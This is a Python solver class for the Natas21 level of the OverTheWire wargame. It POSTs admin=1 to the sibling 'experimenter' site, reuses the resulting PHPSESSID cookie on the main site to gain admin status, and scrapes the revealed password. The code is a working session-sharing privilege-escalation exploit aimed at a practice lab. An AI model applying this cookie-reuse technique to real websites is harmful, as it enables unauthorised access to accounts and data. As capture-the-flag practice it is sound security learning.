import re
from .base_solver import NatasSolver

class Natas21Solver(NatasSolver):
    def solve(self) -> str:
        try:
            # First request to experimenter to set admin=1
            experimenter_url = "http://natas21-experimenter.natas.labs.overthewire.org/"
            response = self.http_client.request(
                method="POST",
                url=experimenter_url,
                auth=(self.username, self.password),
                data={"admin": "1", "submit": "Update"}
            )
            
            # Get PHPSESSID cookie
            if "PHPSESSID" not in response.cookies:
                raise ValueError("No session cookie received")
            
            session_id = response.cookies["PHPSESSID"]
            
            # Make request to main site with the same PHPSESSID
            response = self.make_request(
                cookies={"PHPSESSID": session_id}
            )
            
            match = re.findall(r"Password: ([^<]+)", response.text)
            if not match:
                raise ValueError("Could not find password")
            return match[0].strip()

        except Exception as e:
            raise RuntimeError(f"Failed to solve natas21: {str(e)}")


